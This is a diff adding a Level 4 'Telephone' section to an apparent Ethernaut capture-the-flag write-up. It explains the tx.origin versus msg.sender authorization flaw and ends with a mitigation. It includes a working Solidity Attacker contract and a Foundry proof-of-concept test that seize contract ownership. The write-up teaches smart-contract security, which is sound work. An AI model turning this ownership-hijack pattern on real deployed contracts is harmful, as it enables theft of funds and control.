@@ -208,3 +208,105 @@ contract CoinFilp_Solutions is Test {
 ### Mitigation (The Fix)
 
 Never use on-chain data like `blockhash`, `block.timestamp`, or `block.difficulty` as a source of randomness in smart contracts. They can be manipulated by miners or easily pre-calculated by attackers. To achieve secure, cryptographically verifiable randomness on the blockchain, you must use an off-chain Oracle service, such as **Chainlink VRF (Verifiable Random Function)**.
+
+---
+
+## Level 4: Telephone
+
+### Objective
+Claim ownership of the contract.
+
+### Vulnerability Analysis
+The smart contract contains a critical flaw in its authorization logic. It uses `tx.origin` to verify the sender instead of `msg.sender` in the `changeOwner` function:
+```solidity
+if (tx.origin != msg.sender) {
+    owner = _owner;
+}
+
+```
+
+In the Ethereum Virtual Machine (EVM):
+
+* `tx.origin` refers to the original External Owned Account (EOA) that initiated the transaction.
+* `msg.sender` refers to the immediate account (or smart contract) that called the function.
+
+By deploying an intermediary "Attacker" contract to make the call on our behalf, we create a scenario where `tx.origin` (our wallet) is different from `msg.sender` (the Attacker contract). This satisfies the `if` condition and allows us to hijack the contract's ownership. Using `tx.origin` for authorization is a common anti-pattern that leaves contracts vulnerable to Phishing attacks.
+
+### Exploit Steps
+
+**Method 1: Remix IDE & Web3 (Cross-Contract Call)**
+
+1. **Deploy the Intermediary Contract:** Use Remix IDE to deploy the following `Attacker` contract, passing the Ethernaut target instance address to the constructor.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
+
+interface ITelephone {
+    function changeOwner(address owner) external;
+}
+
+contract Attacker {
+    ITelephone public target;
+
+    constructor(address _target) {
+        target = ITelephone(_target);
+    }
+
+    function attack() external {
+        // msg.sender here is our wallet address.
+        // We pass it to become the new owner.
+        target.changeOwner(msg.sender);
+    }
+}
+
+```
+
+2. **Execute the Attack:** Call the `attack()` function on your deployed contract. Since the call goes through the Attacker contract, `tx.origin` != `msg.sender`, and ownership is transferred to you.
+
+**Method 2: Foundry (PoC)**
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import {Test, console} from "forge-std/Test.sol";
+import {Telephone} from "../src/04_Telephone/Telephone.sol";
+import {Attacker} from "../src/04_Telephone/Attacker.sol";
+
+contract Telephone_Solutions is Test {
+    Telephone TelephoneContract;
+    Attacker attackerContractl;
+
+    address public owner;
+    address public hacker;
+
+    function setUp() public {
+        // 1. Owner deploys the target contract
+        owner = makeAddr("owner");
+        vm.prank(owner);
+        TelephoneContract = new Telephone();
+
+        // 2. Hacker deploys the attacker contract
+        hacker = makeAddr("hacker");
+        vm.prank(hacker);
+        attackerContractl = new Attacker(address(TelephoneContract));
+    }
+
+    function test_attack() public {
+        // Use vm.prank with two arguments to set both msg.sender and tx.origin to the hacker
+        vm.prank(hacker, hacker);
+        
+        // Execute the attack
+        attackerContractl.attack();
+
+        // Verify the ownership transfer
+        assertEq(TelephoneContract.owner(), hacker, "Hack failed: You are not the owner!");
+    }
+}
+
+```
+
+### Mitigation (The Fix)
+
+Never use `tx.origin` for authorization or access control. Always use `msg.sender`. If you need to ensure that the caller is an EOA (and not a smart contract), you can use `require(tx.origin == msg.sender)`, but this should be used carefully as it breaks composability (preventing other contracts from interacting with yours).
